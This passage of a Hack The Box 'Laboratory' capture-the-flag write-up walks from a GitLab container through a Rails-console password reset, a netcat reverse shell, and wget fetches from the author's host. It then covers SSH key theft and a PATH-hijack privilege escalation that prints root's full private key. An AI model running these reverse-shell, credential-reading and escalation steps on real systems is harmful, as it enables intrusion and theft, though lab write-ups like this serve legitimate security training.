I also took inspiration from the blog post and simply checked directly in the `cgroup` inside `/proc/self` and noticed lots of clues pointing towards this being a docker container.  Next I did some research to find out how to excalate privilege and escape to the host.  I tried copying over the `docker` program to see if I could use that, but it didn't work.

* https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/

```bash
head -n 1 /etc/mtab
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/L7LSQ337NGA4BYNVDWVJF24K7S:/var/lib/docker/overlay2/l/QP6PZPM3CHPVLU5EFDC2PCIZEF:/var/lib/docker/overlay2/l/SWN7J3VHN4U5NWJDDJRDTQNPGL:/var/lib/docker/overlay2/l/EOPUQS5CSJLXCTVPSAZU7GVAKX:/var/lib/docker/overlay2/l/4KTB4YC2OCQWSSPLNDZP5TMM72:/var/lib/docker/overlay2/l/HGGTUBRVH64PJKF4AFLINRAOIV:/var/lib/docker/overlay2/l/PYM2AYLPJ24TL5ER3IMUXP2JOH:/var/lib/docker/overlay2/l/X5KGQPVCDJY4TFAJE42DZLD3PS:/var/lib/docker/overlay2/l/N3PTLJHRCX6QU3GKV36VHYNPXI:/var/lib/docker/overlay2/l/X2GH6JCKITHX3BTYB2CDEVIMZT:/var/lib/docker/overlay2/l/5L6PNYLNRLCGJL4ADEVQONHTPJ,upperdir=/var/lib/docker/overlay2/03982b8a252136c7c04921d43d8f8e550a8ee5a95236122528581f14c93953d3/diff,workdir=/var/lib/docker/overlay2/03982b8a252136c7c04921d43d8f8e550a8ee5a95236122528581f14c93953d3/work,xino=off 0 0
```

* https://github.com/nccgroup/abstractshimmer

I found a potential excape technique, but unfortunately it seemed as if this needs to be run from on the host, and I didn't know enough about the `go` language to make it run remotely.

* https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html

Since I was in a folder inside the `gitlab-rails` directory, I did some research to see what that was.

* https://github.com/sameersbn/docker-gitlab/issues/1384
* https://docs.gitlab.com/ee/security/reset_user_password.html

> The Rake task is capable of finding users via their usernames. However, if only user ID or email ID of the user is known, Rails console can be used to find user using user ID and then change password of the user manually.
>
> Start a Rails console
>
> `sudo gitlab-rails console -e production`
> Find the user either by user ID or email ID:
>  `user = User.find(123)`
> #or
> `user = User.find_by(email: 'user@example.com')`
> Reset the password
> `user.password = 'secret_pass'`
> `user.password_confirmation = 'secret_pass'`
>
> When using this method instead of the Users API, GitLab sends an email to the user stating that the user changed their password. If the password was changed by an administrator, execute the following command to notify the user by email:
> `user.send_only_admin_changed_your_password_notification!`
>
> Save the changes:
>
> `user.save!`
>
> Exit the console, and then try to sign in with your new password.

I found instructions for resetting a user's GitLab password using the Rails console, so I decided to try to do that.

```ruby
gitlab-rails console -e production
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
Switch to inspect mode.

user = User.find_by(email: 'dexter@laboratory.htb')
```
I tried loading the gitlab-rails console, but it only halfway loaded, and even that took a few minutes.  I could not get it to go an further than that.

```bash
#!/bin/bash
./nc 10.10.14.161 8082 -e /bin/bash
```

Next, I created a simple bash script that would send me a reverse shell from the machine using `netcat`. I figured that the Rails console wouldn't load because of the limited Ruby shell I was trapped inside.

```
zweilos@kalimaa:~/htb/laboratory$ nc -lvnp 42069
listening on [any] 42069 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.216] 42462
wget http://10.10.14.161:8081/nc
chmod +x nc
wget http://10.10.14.161:8081/test.sh
chmod +x test.sh
ls -la
total 48
drwx------ 2 git root  4096 Mar 18 22:04 .
drwxr-xr-x 9 git root  4096 Mar 18 20:37 ..
-rwxr-xr-x 1 git git  34952 Aug 29  2020 nc
-rwxr-xr-x 1 git git     48 Mar 18 21:53 test.sh
./test.sh
```

I used `wget` to copy over `netcat` and my reverse shell script then ran it.

```
zweilos@kalimaa:~/htb/laboratory$ nc -lvnp 8082
listening on [any] 8082 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.216] 54352
gitlab-rails console -e production
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
Switch to inspect mode.
which python3
which python3
NameError (undefined local variable or method `python3' for main:Object)
        from (irb):1
```

I caught the reverse shell back on my machine and tried to load the Rails console.  It looked as if it was finally working! (Or so the `NameError` error message seemed to say).

```ruby
user = User.find_by(email: 'dexter@laboratory.htb')
user = User.find_by(email: 'dexter@laboratory.htb')
nil
 user = User.find(1)
 user = User.find(1)
#<User id:1 @dexter>
```

Since there was no prompt, I had to assume that the console was loaded, and I continued where I left off. I tried to enumerate users through the email address I had seen, but got back `nil`.  When I tried to see what the first user was, I got back `dexter`.  

```ruby
user.password = 'secret_pass'
user.password = 'secret_pass'
"secret_pass"
user.password_confirmation = 'secret_pass'
user.password_confirmation = 'secret_pass'
"secret_pass"
user.save!
user.save!
true

```

Next I tried changing the user's password to `secret_pass` by following the instructions from the blog post, and it looked as if it was sucessful.

![I failed to log in using the email address](/assets/img/laboratory-12-dexter-signin.png)

The email address `dexter@laboratory.htb` did not work for logging in.  I figured that the email had not actually been used by the user to create the account and tried a username instead.  I was able to login using the username `dexter` and the password I had created.

![There was a SecureDocker project marked as Confidential in the Projects folder](/assets/img/laboratory-13-dexter-gitlab.png)

Now that I had logged in as `dexter`, there was another project visible, this one called `SecureDocker`.  

![The project also contained "some personal stuff"](/assets/img/laboratory-14-secure-docker.png)

It was marked as confidential and contained "some personal stuff", which sounded enticing.

> CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.

![The create gitlab bash script](/assets/img/laboratory-15-secure-gitlab-sh.png)

The `create_gitlab.sh` script contained instructions for launching the docker container that housed the GitLab instance.  It set the hostname of `git.laboratory.htb` and made the three ports I had found open available to the outside.

### Finding user creds

![The dexter folder contained an SSH folder](/assets/img/laboratory-15-dexter-folder.png)

In the dexter folder there was a `.ssh` folder, a `recipe.url`, and a `todo.txt`.  

![There was an RSA OpenSSH private key in the SSH folder](/assets/img/laboratory-15-dexter-ssh-key.png)

In the `.ssh` folder, there were two files: an `id_rsa` secret key that I exfiltrated to my machine, and an `authorized_keys` file.  The `authorized_keys` file only contained one entry

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxl8OPcBJ1vlhLczCOwPz7km+d6VSz7IjbtW4MPs/bWh1J81SAIK2hIT6/yw81oH/EXQJWpAe2eGdZ7qd3FdYfBvfhROh2rqDac6W+05D0hPFJ68NJwz9y0jqHjZ0UGGz7xxb25LE7CUVHhvvQT62/cEzdahaDCle+C4/a5kXhJQ1Yr/x2z1PFhboLVaQALxnbkzse0td/Va5dT/aOfDb1vODM7ikk+8wdTFdXA3zf2MBOBCU2nn25AMFSJxd7Can/klIus49BKQOsRgCckwHh/1E13JsLoS+ZeyBL1+jgsbKFIC4W1PU6OrI5jW7AsZakviNwPEqJ+4Iw8t/mClJAe/DR+rr+EXhKmoziJcMZjunnbB7Qp6TeE/QOpC0S+7EJrvCmfcjW0qw2ZqCdd2oHeQirloRsZIRJthMBS+HjmDDaCTSX7dOw7NZWjCxomrmQLIObjHR+DwF9w+SQp+KL0qc0qyd1cgfSuDRCWU+MAL9kaGyNZJEbj2s/Kh9diu8= root@laboratory
```

This let me know that `root` also used SSH, and used the same `ssh-rsa` algorithm as `dexter`.  It seemed like this might come in handy later.

```
[InternetShortcut]
URL=https://www.seriouseats.com/recipes/2016/04/french-omelette-cheese-recipe.html

```

The `recipe.url` file contained only a link to a French cheese omelette recipe site, but I noted it in case it was useful later.

```
# DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into "docker compose"
# TODO: Permanently ban DeeDee from lab
```

The `todo.txt` file contained some notes on progress of making things secure for the site (and the lab!).  It seemed as if `dexter` was looking into using `docker compose` but was still in progress.  I looked up docker compose to see if I could find some way to make use of this information.

* https://docs.docker.com/compose/

### User.txt

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ script                                                                                    130 ⨯ 1 ⚙
Script started, output log file is 'typescript'.
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ ssh dexter@laboratory.htb -i dexter.key
The authenticity of host 'laboratory.htb (10.10.10.216)' can't be established.
ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'laboratory.htb' (ECDSA) to the list of known hosts.
dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
dexter@laboratory:~$ cat user.txt 
cea862f097d3d10b4cb75305b84ed74c
```

After exfiltrating `dexter`'s SSH key from the gitlab project, I was able to use it to log in.  The `user.txt` proof was waiting in `dexter`'s home directory.

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `dexter`

```
dexter@laboratory:~$ cat /proc/self/cgroup
12:memory:/system.slice/ssh.service
11:devices:/system.slice/ssh.service
10:freezer:/
9:hugetlb:/
8:cpuset:/
7:pids:/system.slice/ssh.service
6:blkio:/system.slice/ssh.service
5:perf_event:/
4:rdma:/
3:cpu,cpuacct:/system.slice/ssh.service
2:net_cls,net_prio:/
1:name=systemd:/system.slice/ssh.service
0::/system.slice/ssh.service
dexter@laboratory:~$ hostname
laboratory
```

I checked `/proc/self/cgroup` to make sure that this time I was not in a docker container.

```
dexter@laboratory:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dexter:x:1000:1000:Dexter McPherson:/home/dexter:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```

I looked inside `/etc/passwd` to see if it was different from the one in the container.  This time it only showed two users could log in, `dexter`, and `root`. 

![The file docker-security was suspicious](/assets/img/laboratory-17-docker-security.png)

```
-rwsr-xr-x 1 root   dexter           17K Aug 28  2020 /usr/local/bin/docker-security
```

I ran `linpeas.sh` and while reviewing the output I noticed a line that stuck out under the setuid binaries section. This program runs under the context of the root user, but it also belongs to the `dexter` group.  This was clearly a security misconfiguration that I could take advantage of.

```
dexter@laboratory:~$ /usr/local/bin/docker-security
dexter@laboratory:~$ file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
dexter@laboratory:~$ /usr/local/bin/docker-security --help
dexter@laboratory:~$ man docker-security
No manual entry for docker-security
```

I tried running the program, but there was no output that I could see.  There was also no help or man page.  I also tried searching the web for information about this binary, but there was nothing that directly referenced it.  I figured it must be a custom binary.

![The Ghidra load screen showed the basic information about the binary file](/assets/img/laboratory-18-ghidra1.png)

Next I exfiltrated the binary to my machine and opened it in `ghidra` to figure out what it did.

![The main function of this program runs setuid and setgid to zero](/assets/img/laboratory-19-ghidra2.png)

It didn't take me long to find a serious problem with this program.  The main function of the program set the uid and gid to 0 (root), then ran two system commands with this context.  The problem was, it was calling the `chmod` program without specifying the full path.  With this I should be able to create my own program (or even a script) called `chmod` that was in `$PATH` before the real one and hijack the execution of this program to run arbitrary code as root.

```
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ which chmod
/usr/bin/chmod
```

I checked which folders were in `$PATH` and then checked which folder `chmod` was in.  With this information I could plan where to insert my script to hijack the functionality of the `docker-security` program.

```
dexter@laboratory:/usr/local/bin$ PATH="/dev/shm${PATH:+:${PATH}}"dexter@laboratory:/usr/local/bin$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

I added `/dev/shm` to the beginning of the `$PATH` environment variable, which would ensure whatever binaries the operating system looked for (that I ran) would be found in that folder before any others.

```bash
#!/bin/bash
cat /root/.ssh/id_rsa
```

Since I suspected that root had an `id_rsa` file, I wrote my first test script so that it would print out `root`'s private key so I could SSH in.  I named it `chmod` and put it in `/dev/shm`, then ran the `docker-security` program.

### Getting a root shell

```
dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

When I ran the `docker-security` program, `root`'s private key was output to the terminal.  It printed it twice because the `docker-security` program ran my fake `chmod` twice.  

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ ssh root@10.10.10.216 -i root.key
root@laboratory:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
laboratory
root@laboratory:~# ls -la
total 68
drwx------  7 root root  4096 Feb 10 16:02 .
drwxr-xr-x 20 root root  4096 Jan  8 16:17 ..
lrwxrwxrwx  1 root root     9 Jul 17  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  3135 Jun 26  2020 .bashrc
drwx------  2 root root  4096 Oct 21 11:59 .cache
drwx------  3 root root  4096 Oct 20 18:36 .config
drwxr-xr-x  3 root root  4096 Jun 26  2020 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
-rw-------  1 root root    33 Mar 19 01:38 root.txt
-rw-r--r--  1 root root    66 Jul  5  2020 .selected_editor
drwx------  2 root root  4096 Jun 30  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct 22 08:46 .vim
-rw-------  1 root root 22393 Feb 10 16:02 .viminfo
```

I saved this private key to my machine and used it to SSH in as `root`.

### Root.txt

```
root@laboratory:~# cat root.txt 
f8bbeeaae20b8d7cae14752ca51bd6b2
```

After that, I just had to collect my proof.

![Proof that I had completed this challenge](/assets/img/laboratory-0-lab-pwned.png)

Thanks to [`0xc45`](https://app.hackthebox.eu/users/73268) for an interesting take on a machine that trapped the attacker into a docker container, which they originally thought to be the machine they wanted to compromise.  The user of the machine had obviously tried to think about security, but was overconfident and made a simple mistake when compiling the program that was supposed to secure the machine, instead leading to it's complete take over.  This goes to show that simple little clues and mistakes can lead a determined attacker to find cracks in a system that allow them in!

If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or in the comments below!

If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>